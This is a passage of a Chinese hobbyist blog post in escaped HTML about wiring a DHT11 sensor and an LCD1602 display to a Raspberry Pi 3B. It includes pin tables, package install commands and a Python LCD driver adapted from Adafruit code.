class=\"number\">2</span> ** (<span class=\"number\">7</span>-i)</div><div class=\"line\"></div><div class=\"line\">  tmp = humidity + humidity_point + temperature + temperature_point</div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">if</span> check == tmp:</div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'temp:'</span> + str(temperature) + <span class=\"string\">' C \\nhumidity:'</span> + str(humidity) + <span class=\"string\">'%'</span></div><div class=\"line\">  <span class=\"keyword\">else</span>:</div><div class=\"line\">    get_tmp()</div><div class=\"line\"></div><div class=\"line\">  GPIO.cleanup()    </div><div class=\"line\"></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Adafruit_CharLCD</span>:</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># commands</span></div><div class=\"line\">    LCD_CLEARDISPLAY            = <span class=\"number\">0x01</span></div><div class=\"line\">    LCD_RETURNHOME                  = <span class=\"number\">0x02</span></div><div class=\"line\">    LCD_ENTRYMODESET            = <span class=\"number\">0x04</span></div><div class=\"line\">    LCD_DISPLAYCONTROL          = <span class=\"number\">0x08</span></div><div class=\"line\">    LCD_CURSORSHIFT             = <span class=\"number\">0x10</span></div><div class=\"line\">    LCD_FUNCTIONSET             = <span class=\"number\">0x20</span></div><div class=\"line\">    LCD_SETCGRAMADDR            = <span class=\"number\">0x40</span></div><div class=\"line\">    LCD_SETDDRAMADDR            = <span class=\"number\">0x80</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># flags for display entry mode</span></div><div class=\"line\">    LCD_ENTRYRIGHT              = <span class=\"number\">0x00</span></div><div class=\"line\">    LCD_ENTRYLEFT               = <span class=\"number\">0x02</span></div><div class=\"line\">    LCD_ENTRYSHIFTINCREMENT     = <span class=\"number\">0x01</span></div><div class=\"line\">    LCD_ENTRYSHIFTDECREMENT     = <span class=\"number\">0x00</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># flags for display on/off control</span></div><div class=\"line\">    LCD_DISPLAYON               = <span class=\"number\">0x04</span></div><div class=\"line\">    LCD_DISPLAYOFF              = <span class=\"number\">0x00</span></div><div class=\"line\">    LCD_CURSORON                = <span class=\"number\">0x02</span></div><div class=\"line\">    LCD_CURSOROFF               = <span class=\"number\">0x00</span></div><div class=\"line\">    LCD_BLINKON                 = <span class=\"number\">0x01</span></div><div class=\"line\">    LCD_BLINKOFF                = <span class=\"number\">0x00</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># flags for display/cursor shift</span></div><div class=\"line\">    LCD_DISPLAYMOVE             = <span class=\"number\">0x08</span></div><div class=\"line\">    LCD_CURSORMOVE              = <span class=\"number\">0x00</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># flags for display/cursor shift</span></div><div class=\"line\">    LCD_DISPLAYMOVE             = <span class=\"number\">0x08</span></div><div class=\"line\">    LCD_CURSORMOVE              = <span class=\"number\">0x00</span></div><div class=\"line\">    LCD_MOVERIGHT               = <span class=\"number\">0x04</span></div><div class=\"line\">    LCD_MOVELEFT                = <span class=\"number\">0x00</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># flags for function set</span></div><div class=\"line\">    LCD_8BITMODE                = <span class=\"number\">0x10</span></div><div class=\"line\">    LCD_4BITMODE                = <span class=\"number\">0x00</span></div><div class=\"line\">    LCD_2LINE                   = <span class=\"number\">0x08</span></div><div class=\"line\">    LCD_1LINE                   = <span class=\"number\">0x00</span></div><div class=\"line\">    LCD_5x10DOTS                = <span class=\"number\">0x04</span></div><div class=\"line\">    LCD_5x8DOTS                 = <span class=\"number\">0x00</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self, pin_rs=<span class=\"number\">8</span>, pin_e=<span class=\"number\">10</span>, pins_db=[<span class=\"number\">11</span>,<span class=\"number\">12</span>,<span class=\"number\">13</span>,<span class=\"number\">15</span>], GPIO = None)</span>:</span></div><div class=\"line\">        <span class=\"comment\"># Emulate the old behavior of using RPi.GPIO if we haven't been given</span></div><div class=\"line\">        <span class=\"comment\"># an explicit GPIO interface to use</span></div><div class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> GPIO:</div><div class=\"line\">            <span class=\"keyword\">import</span> RPi.GPIO <span class=\"keyword\">as</span> GPIO</div><div class=\"line\">        GPIO.setwarnings(<span class=\"keyword\">False</span>)</div><div class=\"line\"></div><div class=\"line\">        self.GPIO = GPIO</div><div class=\"line\">        self.pin_rs = pin_rs</div><div class=\"line\">        self.pin_e = pin_e</div><div class=\"line\">        self.pins_db = pins_db</div><div class=\"line\"></div><div class=\"line\">        self.GPIO.setmode(GPIO.BOARD)</div><div class=\"line\">        self.GPIO.setup(self.pin_e, GPIO.OUT)</div><div class=\"line\">        self.GPIO.setup(self.pin_rs, GPIO.OUT)</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">for</span> pin <span class=\"keyword\">in</span> self.pins_db:</div><div class=\"line\">            self.GPIO.setup(pin, GPIO.OUT)</div><div class=\"line\"></div><div class=\"line\">        self.write4bits(<span class=\"number\">0x33</span>) <span class=\"comment\"># initialization</span></div><div class=\"line\">        self.write4bits(<span class=\"number\">0x32</span>) <span class=\"comment\"># initialization</span></div><div class=\"line\">        self.write4bits(<span class=\"number\">0x28</span>) <span class=\"comment\"># 2 line 5x7 matrix</span></div><div class=\"line\">        self.write4bits(<span class=\"number\">0x0C</span>) <span class=\"comment\"># turn cursor off 0x0E to enable cursor</span></div><div class=\"line\">        self.write4bits(<span class=\"number\">0x06</span>) <span class=\"comment\"># shift cursor right</span></div><div class=\"line\"></div><div class=\"line\">        self.displaycontrol = self.LCD_DISPLAYON | self.LCD_CURSOROFF | self.LCD_BLINKOFF</div><div class=\"line\"></div><div class=\"line\">        self.displayfunction = self.LCD_4BITMODE | self.LCD_1LINE | self.LCD_5x8DOTS</div><div class=\"line\">        self.displayfunction |= self.LCD_2LINE</div><div class=\"line\"></div><div class=\"line\">        <span class=\"string\">\"\"\" Initialize to default text direction (for romance languages) \"\"\"</span></div><div class=\"line\">        self.displaymode =  self.LCD_ENTRYLEFT | self.LCD_ENTRYSHIFTDECREMENT</div><div class=\"line\">        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode) <span class=\"comment\">#  set the entry mode</span></div><div class=\"line\"></div><div class=\"line\">        self.clear()</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">begin</span><span class=\"params\">(self, cols, lines)</span>:</span></div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">if</span> (lines &gt; <span class=\"number\">1</span>):</div><div class=\"line\">                self.numlines = lines</div><div class=\"line\">                self.displayfunction |= self.LCD_2LINE</div><div class=\"line\">                self.currline = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">home</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\"></div><div class=\"line\">        self.write4bits(self.LCD_RETURNHOME) <span class=\"comment\"># set cursor position to zero</span></div><div class=\"line\">        self.delayMicroseconds(<span class=\"number\">3000</span>) <span class=\"comment\"># this command takes a long time!</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">clear</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\"></div><div class=\"line\">        self.write4bits(self.LCD_CLEARDISPLAY) <span class=\"comment\"># command to clear display</span></div><div class=\"line\">        self.delayMicroseconds(<span class=\"number\">3000</span>)    <span class=\"comment\"># 3000 microsecond sleep, clearing the display takes a long time</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">setCursor</span><span class=\"params\">(self, col, row)</span>:</span></div><div class=\"line\"></div><div class=\"line\">        self.row_offsets = [ <span class=\"number\">0x00</span>, <span class=\"number\">0x40</span>, <span class=\"number\">0x14</span>, <span class=\"number\">0x54</span> ]</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">if</span> ( row &gt; self.numlines ): </div><div class=\"line\">                row = self.numlines - <span class=\"number\">1</span> <span class=\"comment\"># we count rows starting w/0</span></div><div class=\"line\"></div><div class=\"line\">        self.write4bits(self.LCD_SETDDRAMADDR | (col + self.row_offsets[row]))</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">noDisplay</span><span class=\"params\">(self)</span>:</span> </div><div class=\"line\">        <span class=\"string\">\"\"\" Turn the display off (quickly) \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaycontrol &amp;= ~self.LCD_DISPLAYON</div><div class=\"line\">        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">display</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" Turn the display on (quickly) \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaycontrol |= self.LCD_DISPLAYON</div><div class=\"line\">        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">noCursor</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" Turns the underline cursor on/off \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaycontrol &amp;= ~self.LCD_CURSORON</div><div class=\"line\">        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">cursor</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" Cursor On \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaycontrol |= self.LCD_CURSORON</div><div class=\"line\">        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">noBlink</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" Turn on and off the blinking cursor \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaycontrol &amp;= ~self.LCD_BLINKON</div><div class=\"line\">        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">noBlink</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" Turn on and off the blinking cursor \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaycontrol &amp;= ~self.LCD_BLINKON</div><div class=\"line\">        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">DisplayLeft</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" These commands scroll the display without changing the RAM \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.write4bits(self.LCD_CURSORSHIFT | self.LCD_DISPLAYMOVE | self.LCD_MOVELEFT)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">scrollDisplayRight</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" These commands scroll the display without changing the RAM \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.write4bits(self.LCD_CURSORSHIFT | self.LCD_DISPLAYMOVE | self.LCD_MOVERIGHT);</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">leftToRight</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" This is for text that flows Left to Right \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaymode |= self.LCD_ENTRYLEFT</div><div class=\"line\">        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode);</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">rightToLeft</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" This is for text that flows Right to Left \"\"\"</span></div><div class=\"line\">        self.displaymode &amp;= ~self.LCD_ENTRYLEFT</div><div class=\"line\">        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">autoscroll</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" This will 'right justify' text from the cursor \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaymode |= self.LCD_ENTRYSHIFTINCREMENT</div><div class=\"line\">        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">noAutoscroll</span><span class=\"params\">(self)</span>:</span> </div><div class=\"line\">        <span class=\"string\">\"\"\" This will 'left justify' text from the cursor \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaymode &amp;= ~self.LCD_ENTRYSHIFTINCREMENT</div><div class=\"line\">        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">write4bits</span><span class=\"params\">(self, bits, char_mode=False)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" Send command to LCD \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.delayMicroseconds(<span class=\"number\">1000</span>) <span class=\"comment\"># 1000 microsecond sleep</span></div><div class=\"line\"></div><div class=\"line\">        bits=bin(bits)[<span class=\"number\">2</span>:].zfill(<span class=\"number\">8</span>)</div><div class=\"line\"></div><div class=\"line\">        self.GPIO.output(self.pin_rs, char_mode)</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">for</span> pin <span class=\"keyword\">in</span> self.pins_db:</div><div class=\"line\">            self.GPIO.output(pin, <span class=\"keyword\">False</span>)</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">4</span>):</div><div class=\"line\">            <span class=\"keyword\">if</span> bits[i] == <span class=\"string\">\"1\"</span>:</div><div class=\"line\">                self.GPIO.output(self.pins_db[::<span class=\"number\">-1</span>][i], <span class=\"keyword\">True</span>)</div><div class=\"line\"></div><div class=\"line\">        self.pulseEnable()</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">for</span> pin <span class=\"keyword\">in</span> self.pins_db:</div><div class=\"line\">            self.GPIO.output(pin, <span class=\"keyword\">False</span>)</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">4</span>,<span class=\"number\">8</span>):</div><div class=\"line\">            <span class=\"keyword\">if</span> bits[i] == <span class=\"string\">\"1\"</span>:</div><div class=\"line\">                self.GPIO.output(self.pins_db[::<span class=\"number\">-1</span>][i<span class=\"number\">-4</span>], <span class=\"keyword\">True</span>)</div><div class=\"line\"></div><div class=\"line\">        self.pulseEnable()</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delayMicroseconds</span><span class=\"params\">(self, microseconds)</span>:</span></div><div class=\"line\">        seconds = microseconds / float(<span class=\"number\">1000000</span>) <span class=\"comment\"># divide microseconds by 1 million for seconds</span></div><div class=\"line\">        sleep(seconds)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">pulseEnable</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        self.GPIO.output(self.pin_e, <span class=\"keyword\">False</span>)</div><div class=\"line\">        self.delayMicroseconds(<span class=\"number\">1</span>)               <span class=\"comment\"># 1 microsecond pause - enable pulse must be &gt; 450ns </span></div><div class=\"line\">        self.GPIO.output(self.pin_e, <span class=\"keyword\">True</span>)</div><div class=\"line\">        self.delayMicroseconds(<span class=\"number\">1</span>)               <span class=\"comment\"># 1 microsecond pause - enable pulse must be &gt; 450ns </span></div><div class=\"line\">        self.GPIO.output(self.pin_e, <span class=\"keyword\">False</span>)</div><div class=\"line\">        self.delayMicroseconds(<span class=\"number\">1</span>)               <span class=\"comment\"># commands need &gt; 37us to settle</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">message</span><span class=\"params\">(self, text)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" Send string to LCD. Newline wraps to second line\"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">for</span> char <span class=\"keyword\">in</span> text:</div><div class=\"line\">            <span class=\"keyword\">if</span> char == <span class=\"string\">'\\n'</span>:</div><div class=\"line\">                self.write4bits(<span class=\"number\">0xC0</span>) <span class=\"comment\"># next line</span></div><div class=\"line\">            <span class=\"keyword\">else</span>:</div><div class=\"line\">                self.write4bits(ord(char),<span class=\"keyword\">True</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">while</span> <span class=\"keyword\">True</span>:</div><div class=\"line\">        tmp = get_tmp() </div><div class=\"line\">        <span class=\"keyword\">if</span> tmp:</div><div class=\"line\">            lcd = Adafruit_CharLCD()</div><div class=\"line\">            lcd.noBlink()</div><div class=\"line\">            lcd.clear()</div><div class=\"line\">            lcd.message(tmp)</div><div class=\"line\">        sleep(<span class=\"number\">5</span>)</div></pre></td></tr></table></figure></p>\n<h1 id=\"运行效果\"><a href=\"#运行效果\" class=\"headerlink\" title=\"运行效果\"></a>运行效果</h1><p><img src=\"/content/images/2016/08/WechatIMG302.jpeg\" alt=\"\"></p>\n<p><img src=\"/content/images/2016/08/WechatIMG293.jpeg\" alt=\"\"></p>\n<h1 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h1><p><a href=\"https://gist.github.com/hugozhu/6166527\" target=\"_blank\" rel=\"external\">https://gist.github.com/hugozhu/6166527</a><br><a href=\"https://github.com/adafruit/Adafruit-Raspberry-Pi-Python-Code/tree/2d4678fdccec1b93d8d69ba7768f6698545b2c5f\" target=\"_blank\" rel=\"external\">https://github.com/adafruit/Adafruit-Raspberry-Pi-Python-Code/tree/2d4678fdccec1b93d8d69ba7768f6698545b2c5f</a><br><a href=\"https://github.com/op2-project/op2-daemon/blob/master/op2d/hal/backend/pihelpers/lcd.py\" target=\"_blank\" rel=\"external\">https://github.com/op2-project/op2-daemon/blob/master/op2d/hal/backend/pihelpers/lcd.py</a><br><a href=\"http://blog.csdn.net/xukai871105/article/details/12684617\" target=\"_blank\" rel=\"external\">http://blog.csdn.net/xukai871105/article/details/12684617</a><br><a href=\"https://www.oschina.net/question/1425530\\_140979\" target=\"_blank\" rel=\"external\">https://www.oschina.net/question/1425530\\_140979</a><br><a href=\"http://bbs.elecfans.com/jishu\\_578437\\_1\\_1.html\" target=\"_blank\" rel=\"external\">http://bbs.elecfans.com/jishu\\_578437\\_1\\_1.html</a><br><a href=\"http://blog.csdn.net/netccy/article/details/48098455\" target=\"_blank\" rel=\"external\">http://blog.csdn.net/netccy/article/details/48098455</a><br><a href=\"https://www.6zou.net/tech/raspberry-pi-lcd1602-system-monitor.html\" target=\"_blank\" rel=\"external\">https://www.6zou.net/tech/raspberry-pi-lcd1602-system-monitor.html</a><br><a href=\"http://hugozhu.myalert.info/2013/03/23/19-raspberry-pi-drive-1602-lcd.html\" target=\"_blank\" rel=\"external\">http://hugozhu.myalert.info/2013/03/23/19-raspberry-pi-drive-1602-lcd.html</a><br><a href=\"http://hugozhu.myalert.info/2013/03/22/19-raspberry-pi-gpio-port-naming.html\" target=\"_blank\" rel=\"external\">http://hugozhu.myalert.info/2013/03/22/19-raspberry-pi-gpio-port-naming.html</a><br><a href=\"http://blog.csdn.net/rocklee/article/details/50082777\" target=\"_blank\" rel=\"external\">http://blog.csdn.net/rocklee/article/details/50082777</a><br><a href=\"http://www.guokr.com/post/718305/\" target=\"_blank\" rel=\"external\">http://www.guokr.com/post/718305/</a><br><a href=\"http://www.rs-online.com/designspark/electronics/blog/content-1148\" target=\"_blank\" rel=\"external\">http://www.rs-online.com/designspark/electronics/blog/content-1148</a><br><a href=\"http://bbs.elecfans.com/jishu\\_582479\\_1\\_1.html\" target=\"_blank\" rel=\"external\">http://bbs.elecfans.com/jishu\\_582479\\_1\\_1.html</a><br><a href=\"https://www.freemindworld.com/blog/2013/130310\\_raspberry\\_pi\\_with\\_lcd.shtml\" target=\"_blank\" rel=\"external\">https://www.freemindworld.com/blog/2013/130310\\_raspberry\\_pi\\_with\\_lcd.shtml</a><br><a href=\"http://blog.csdn.net/u013431550/article/details/40870947\" target=\"_blank\" rel=\"external\">http://blog.csdn.net/u013431550/article/details/40870947</a><br><a href=\"http://www.shumeipai.net/thread-21026-1-1.html?_dsign=0e7b69ba\" target=\"_blank\" rel=\"external\">http://www.shumeipai.net/thread-21026-1-1.html?_dsign=0e7b69ba</a><br><a href=\"http://blog.csdn.net/longerzone/article/details/36171381\" target=\"_blank\" rel=\"external\">http://blog.csdn.net/longerzone/article/details/36171381</a></p>\n","excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>很早就入了树莓派，一直没有折腾GPIO功能，虽然我是学自动化的，但是我对引脚之类的一窍不通，做这个也是为了预习一下本专业的知识，而更多的，是乐趣。</p>\n<p>在淘宝上网购了原料之后，回家发现网上并没有树莓派3B的教程，大部分都是树莓派2B的教程，而树莓派3B的GPIO图都发生了变化，因此写本文的目的还在于帮助更多的人，填补互联网的空白。<br>","more":"</p>\n<h1 id=\"知识储备\"><a href=\"#知识储备\" class=\"headerlink\" title=\"知识储备\"></a>知识储备</h1><ul>\n<li>数字电子技术基础</li>\n<li>微机原理与接口技术</li>\n<li>python语言</li>\n</ul>\n<h1 id=\"原料\"><a href=\"#原料\" class=\"headerlink\" title=\"原料\"></a>原料</h1><ul>\n<li>树莓派3B</li>\n<li>DHT11</li>\n<li>LCD1602</li>\n<li>2K电阻（也可以是电位器）</li>\n<li>子-母 和 母-母 杜邦线</li>\n<li>电气绝缘胶带</li>\n<li>剪刀</li>\n<li>一颗耐心和一颗细心</li>\n</ul>\n<h1 id=\"语言\"><a href=\"#语言\" class=\"headerlink\" title=\"语言\"></a>语言</h1><ul>\n<li>Python 2.7</li>\n</ul>\n<h1 id=\"组件\"><a href=\"#组件\" class=\"headerlink\" title=\"组件\"></a>组件</h1><ul>\n<li>python-dev</li>\n<li>python-rpi.gpio<br>如果不具备以上，请执行：<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get update</div><div class=\"line\">sudo apt-get install python-dev</div><div class=\"line\">sudo apt-get install python-rpi.gpio</div></pre></td></tr></table></figure>\n</li>\n</ul>\n<h1 id=\"接线\"><a href=\"#接线\" class=\"headerlink\" title=\"接线\"></a>接线</h1><p>我们一共要完成两个任务：</p>\n<ul>\n<li>1.连接LCD1602</li>\n<li>2.连接DHT11</li>\n</ul>\n<p>树莓派3B的GPIO图如下：</p>\n<p><img src=\"/content/images/2016/08/GPIO.png\" alt=\"\"></p>\n<h2 id=\"2K-电阻如何连接到电路\"><a href=\"#2K-电阻如何连接到电路\" class=\"headerlink\" title=\"2K 电阻如何连接到电路\"></a>2K 电阻如何连接到电路</h2><p>简单粗暴的方法就是把电阻两头连接到两个子-母杜邦线上，然后用绝缘胶布缠上，非常方便美观。</p>\n<h2 id=\"LCD1602-接线方案\"><a href=\"#LCD1602-接线方案\" class=\"headerlink\" title=\"LCD1602 接线方案\"></a>LCD1602 接线方案</h2><p>LCD 与 树莓派相连 方案图，2K电阻是我自行设计，如果有电位器最好放置电位器：<br><img src=\"/content/images/2016/08/LCD1602--.jpg\" alt=\"\"></p>\n<p>树莓派的USB端口朝下，电源线位置朝上方向摆放。<br>右端一共有40个引脚，每个引脚的PIN位置如上。</p>\n<p>VSS，接地，RPi PIN 6<br>VDD，接5V电源，PRi PIN 2<br>VO，液晶对比度调节，接1K 电阻，另一端相连接地，PIN 9<br>RS，寄存器选择，接GPIO 14，RPi PIN 8<br>RW，读写选择，接地，表示写模式，PRi PIN 6<br>E，使能信号，接GPIO 15，RPi PIN 10<br>D0，数据位0，4位工作模式下不用，不接<br>D1，数据位1，4位工作模式下不用，不接<br>D2，数据位2，4位工作模式下不用，不接<br>D3，数据位3，4位工作模式下不用，不接<br>D4，数据位4，接GPIO 17，RPi PIN 11<br>D5，数据位5，接GPIO 18，RPi PIN 12<br>D6，数据位6，接GPIO 27，RPi PIN 13<br>D7，数据位7，接GPIO 22，RPi PIN 15<br>A，液晶屏背光+，接5V，RPi PIN 4<br>K，液晶屏背光-，接地，RPi PIN 39</p>\n<p><strong>连接好后，务必要仔细检查是否连接正确，以防开机烧坏GPIO甚至树莓派。</strong></p>\n<p>建议在关机情况下接线，如果在开机情况下接线，VDD请最后连接。</p>\n<h2 id=\"LCD1602-开机测试\"><a href=\"#LCD1602-开机测试\" class=\"headerlink\" title=\"LCD1602 开机测试\"></a>LCD1602 开机测试</h2><p>接通电源线，默认情况下，如果连接正确：</p>\n<ul>\n<li>肯定没有爆炸</li>\n<li>会出现如下图的效果，证明你已经接线成功了<br><img src=\"/content/images/2016/08/1.jpg\" alt=\"\"></li>\n</ul>\n<h2 id=\"DHT11-接线方案\"><a href=\"#DHT11-接线方案\" class=\"headerlink\" title=\"DHT11 接线方案\"></a>DHT11 接线方案</h2><p>接线简单，主要是把数据传输到GPIO26上</p>\n<p>DHT11有3个脚，VCC，DATA，GND<br>VCC 接 3.3V PIN 01<br>DATA 接 GPIO26 PIN 37<br>GND 接地  PIN 09</p>\n<p>#代码<br>采用python语言编写，由于html对tab和空格的支持不好，复制容易产生编译问题，代码已经传到github</p>\n<p><a href=\"https://github.com/yfgeek/rpi-TmpHmdRuntime\">https://github.com/yfgeek/rpi-TmpHmdRuntime</a><br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div 